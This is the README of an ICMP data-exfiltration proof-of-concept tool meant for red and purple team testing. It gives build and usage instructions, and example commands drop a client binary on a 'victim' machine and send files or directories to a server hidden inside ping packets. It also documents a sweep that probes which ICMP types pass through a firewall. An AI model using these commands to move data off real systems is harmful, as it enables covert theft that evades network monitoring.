# ISneakMP

![ISneakMP](img/ISneakMP.png)

ISneakMP is a simple ICMP exfiltration proof-of-concept tool designed for red and/or purple team tests. The tool, which consists of a separate server and client, can send a file or the contents of a directory to a target server using any type of ICMP packets (such as echo requests, a.k.a. pings).

It can also execute an "ICMP sweep" that sends a single packet of all ICMP type numbers (0-255) to the server to see what gets through.

This tool was inspired by the [ICMP-TransferTools](https://github.com/icyguider/ICMP-TransferTools/tree/main) project, and was developed using assistance from generative AI. 

# Quick Start for Sending Files

## Server 

Clone the repo and start the server:

```
git clone 
cd ISneakMP/server
sudo go run server.go 
# or just go run server.go if on Windows, but from an admin shell
```

By default, received files will be saved in the current directory (from which the server is being run).

## Client

You'll probably want to compile it and drop the binary on the "victim"/test client machine. From your development machine:

```
git clone
cd ISneakMP/client
GOOS=<client_OS> go build .

# E.g., for a Windows client:
# GOOS=windows go build .
```

Then drop the output binary on the client machine, and run:

```
# Send a single file
<path_to_output_binary> -t <server_ip> -f <file_to_send>

# Send contents of a directory
<path_to_output_binary> -t <server_ip> -d <directory>
```

Example (on a Windows client to a server at 192.168.1.10):

```
.\client.exe -t "192.168.1.10" -f "C:\super_secret_file.txt"
```

By default, this will use ICMP type 8 (echo request, a.k.a. ping). You can change this by using the `-i` flag.

> [!IMPORTANT]
> On Windows, the client needs to be run with elevated privileges since you need access to raw sockets. Elevated privileges are not required on Linux since ICMP can be used with `udp4`.

# Quick Start for "ICMP Sweep"

## Server

```
git clone 
cd ISneakMP/server
sudo go run server.go -s
# or just go run server.go if on Windows, but from an admin shell
```

## Client

You'll probably want to compile it and drop the binary on the "victim"/test client machine. From your development machine:

```
git clone
cd ISneakMP/client
GOOS=<client_OS> go build .

# E.g., for a Windows client:
# GOOS=windows go build .
```

Then drop the output binary on the client machine, and run:

```
<path_to_output_binary> -t <server_ip> -s
```

Example (on a Windows client to a server at 192.168.1.10):

```
.\client.exe -t 192.168.1.10 -s
```

# Full Usage

## Server

```
$ ./server -h         
Usage: ./server [OPTIONS]

DESCRIPTION
    

OPTIONS
    -h, --help
        Display this help message.

    -o, --outDir=STRING
        Directory to write received files

    -s, --sweep
        Run in sweep mode to listen for a sweep of packets with all ICMP types,
        to see what gets through (see client.go for more info)

    -t, --timeout=INT
        Seconds to wait after first block before timing out
```

## Client

E.g., from a Windows client:

```
> .\client.exe -h
Usage: \path\to\client.exe [OPTIONS]

DESCRIPTION
    

OPTIONS
    -b, --block=INT
        Block size (in bytes) per ICMP packet

    -d, --directory=STRING
        Path to directory with files to send - NOTE: you cannot pass both a
        directory AND a file

    -f, --file=STRING
        Path to the file to send - NOTE: you cannot pass both a directory AND a
        file

    -h, --help
        Display this help message.

    -i, --icmp-type=INT
        ICMP type number to use. Common types:
        0=Echo Reply, 3=Dest Unreachable, 5=Redirect, 8=Echo (default),
        9=Router Advert, 10=Router Solicit, 11=Time Exceeded,
        12=Parameter Problem, 13=Timestamp, 14=Timestamp Reply,
        40=Photuris, 42=Extended Echo Request, 43=Extended Echo Reply

    -s, --sweep
        Sends a single packet of all ICMP types to the server to see what gets
        through

    -t, --target=STRING
        IP address of the target server where the data will be sent
```

# Credits

- As mentioned above, this tool was inspired by the [ICMP-TransferTools](https://github.com/icyguider/ICMP-TransferTools/tree/main) project
- As usual, thanks to [mjwhitta](https://github.com/mjwhitta) for the help and mentoring
- Claude Code was used for assistance from AI